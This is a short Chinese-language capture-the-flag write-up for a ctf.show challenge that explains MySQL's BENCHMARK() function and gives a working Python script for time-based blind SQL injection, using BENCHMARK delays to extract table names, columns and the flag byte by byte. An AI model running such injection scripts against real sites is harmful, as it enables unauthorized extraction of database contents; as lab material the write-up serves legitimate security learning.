# 知识点
### benchmark
benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式
```bash
mysql> select BENCHMARK(10000,md5('a'));
+---------------------------+
| BENCHMARK(10000,md5('a')) |
+---------------------------+
|                         0 |
+---------------------------+
1 row in set (0.00 sec)

mysql> select BENCHMARK(1000000,md5('a'));
+-----------------------------+
| BENCHMARK(1000000,md5('a')) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (0.33 sec)

mysql> select BENCHMARK(10000000,md5('a'));
+------------------------------+
| BENCHMARK(10000000,md5('a')) |
+------------------------------+
|                            0 |
+------------------------------+
1 row in set (2.93 sec)
```
# 思路
sleep被禁我们可以转而使用benchmark进行延时盲注
```bash
import requests
import time
url = 'http://bdf760c7-f73b-44b4-999c-082b61afb17e.challenge.ctf.show/api/'
str = ''
for i in range(60):
    min,max = 32, 128
    while True:
        j = min + (max-min)//2
        if(min == j):
            str += chr(j)
            print(str)
            break
        # 爆表名
        # payload = {
        #     'ip': f"'') or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))<{j},benchmark(3000000,sha(1)),'False')#",
        #     'debug': 0
        # }
        # 爆列
        # payload = {
        #     'ip': f"'') or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxccb'),{i},1))<{j},benchmark(3000000,sha(1)),'False')#",
        #     'debug': 0
        # }
        # 爆值
        payload = {
            'ip': f"'') or if(ascii(substr((select group_concat(flagaabc) from ctfshow_flagxccb),{i},1))<{j},benchmark(3000000,sha(1)),'False')#",
            'debug': 0
        }
        start_time = time.time()
        r = requests.post(url=url, data=payload).text
        end_time = time.time()
        sub = end_time - start_time
        if sub >= 0.5:
            max = j
        else:
            min = j

```
